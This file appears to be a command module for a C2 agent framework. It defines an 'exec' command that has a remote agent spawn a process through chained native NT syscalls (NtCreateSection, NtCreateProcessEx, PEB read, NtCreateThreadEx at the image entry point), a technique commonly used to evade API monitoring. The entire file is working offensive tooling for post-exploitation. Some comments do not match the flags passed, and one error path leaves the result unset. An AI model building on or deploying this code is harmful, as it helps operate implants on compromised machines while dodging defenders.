NAME = "exec"
DESCRIPTION = "Execute a process using NtCreateProcessEx and NtCreateSection (Native Spawn)"
PARAMS = [
    {"name":"path", "description":"Native path to EXE (e.g. \\??\\C:\\Windows\\System32\\calc.exe)", "type":"str"}
]

DEPENDENCIES = [
    "NtOpenFile",
    "NtCreateSection",
    "NtCreateProcessEx",
    "NtQueryInformationProcess",
    "NtCreateThreadEx",
    "NtClose",
    "NtReadFile",
    "GetExeEntryPoint",
    "NtReadVirtualMemory"
]
DEFAULT = True

def function(agent_id, args):
    from services.orders import read_from_agent
    import struct

    exe_path = args[0] if args[0].startswith("\\??\\") else "\\??\\" + args[0]

    # 1. OPEN THE FILE
    # Access: FILE_READ_DATA | FILE_EXECUTE | SYNCHRONIZE (0x120021)
    # Share: FILE_SHARE_READ (0x01)
    open_ret = NtOpenFile(agent_id, [exe_path, 0x120021, 0x01, 0x20, 0])
    if open_ret["retval"] != 0:
        return {"Result": f"Failed to open file: {hex(open_ret['retval'])}"}
    h_file = open_ret["FILE_HANDLE"]

    # 2. CREATE IMAGE SECTION
    # Access: SECTION_ALL_ACCESS (0xF001F)
    # Attributes: SEC_IMAGE (0x01000000)
    section_ret = NtCreateSection(agent_id, [h_file, 0xF001F])
    NtClose(agent_id, [h_file]) # Handle no longer needed after section creation
    
    if section_ret["retval"] != 0:
        return {"Result": f"Failed to create section: {hex(section_ret['retval'])}"}
    #printf"Section handle {section_ret["section_handle"]}")
    h_section = section_ret["section_handle"]

    # 3. CREATE PROCESS OBJECT
    # Parent: -1 (Current Agent Process)
    # Flags: 1 (PROCESS_CREATE_FLAGS_INHERIT_HANDLES)
    proc_ret = NtCreateProcessEx(agent_id, [h_section, 0x204])
    
    if proc_ret["retval"] != 0:
        NtClose(agent_id, [h_section])
        return {"Result": f"Failed NtCreateProcessEx: {hex(proc_ret['retval'])}"}
    
    h_process = proc_ret["process_handle"]
    # 4. GET ENTRY POINT (ProcessBasicInformation)
    # We query the PEB address to calculate where the image starts
    entrypoint_ret = GetExeEntryPoint(agent_id, [exe_path])
    query_ret = NtQueryInformationProcess(agent_id, [h_process, 0, 0x30]) # 0 = ProcessBasicInformation
    if query_ret["retval"] == 0 and entrypoint_ret["retval"] == 0:
        # We need the ImageBaseAddress from the PEB and the EntryPoint from the NT Headers
        # For simplicity in this native chain, we assume the agent's push_syscall handles 
        # the internal Query + Thread start if not specified, 
        # OR we manually call NtCreateThreadEx.
        #printquery_ret)
        #printentrypoint_ret)
        peb_ret = NtReadVirtualMemory(agent_id, [h_process, query_ret["peb_base"]+0x10, 8])
        if peb_ret["retval"] == 0:
            imagebase = int.from_bytes(peb_ret["data"], byteorder='little')
            entrypoint = imagebase + entrypoint_ret["AddressOfEntryPoint"]
            # 5. CREATE INITIAL THREAD
            # We start execution at the entry point of the mapped image
            thread_ret = NtCreateThreadEx(agent_id, [h_process, entrypoint])
            
            if thread_ret["retval"] == 0:
                h_thread = thread_ret["thread_handle"]
                NtClose(agent_id, [h_thread])
                res_msg = "Success"
            else:
                res_msg = f"Process created but thread failed: {hex(thread_ret['retval'])}"
    else:
        res_msg = f"Process created but info query failed: {hex(query_ret['retval'])}"

    # CLEANUP
    NtClose(agent_id, [h_section])
    NtClose(agent_id, [h_process])

    return {
        "retval": res_msg,
        "ProcessHandle": hex(h_process) if 'h_process' in locals() else "0",
        "Path": exe_path
    }